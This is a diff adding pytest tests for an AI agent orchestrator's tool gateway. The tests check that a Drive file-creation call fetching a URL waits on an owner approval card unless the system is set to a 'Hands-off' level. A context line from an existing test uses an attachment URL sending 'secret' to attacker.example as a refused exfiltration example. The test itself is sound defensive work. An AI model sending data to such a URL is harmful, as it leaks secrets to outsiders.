@@ -225,3 +225,33 @@ def test_self_send_with_url_attachment_refused() -> None:
                     "attachments": [{"url": "https://attacker.example/?d=secret"}]})
     assert session_call.await_count == 0
     assert "attachment" in json.loads(result)["error"].lower()
+
+
+def test_url_fetch_below_hands_off_is_a_card(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Below Hands-off the fetch waits on an Approve card for the owner."""
+    from openexecutive.orchestrator import levels
+
+    cards: list[tuple[str, str]] = []
+
+    def card(blocked: str, tool: str, _args: dict[str, Any], *, reason: str, mcp: bool = True) -> str:
+        cards.append((tool, reason))
+        return json.dumps({"status": "waiting_for_approval"})
+
+    monkeypatch.setattr(levels, "relaxed", lambda: False)
+    monkeypatch.setattr(levels, "card_or", card)
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__create_drive_file",
+                   {"file_name": "a.pdf", "fileUrl": "https://example.com/a.pdf"})
+    assert json.loads(result)["status"] == "waiting_for_approval"
+    assert cards == [("google_workspace__create_drive_file", levels.URL_FETCH)]
+    assert session_call.await_count == 0
+
+
+def test_url_fetch_on_hands_off_goes(monkeypatch: pytest.MonkeyPatch) -> None:
+    from openexecutive.orchestrator import levels
+
+    monkeypatch.setattr(levels, "relaxed", lambda: True)
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__create_drive_file",
+          {"file_name": "a.pdf", "fileUrl": "https://example.com/a.pdf"})
+    assert session_call.await_count == 1
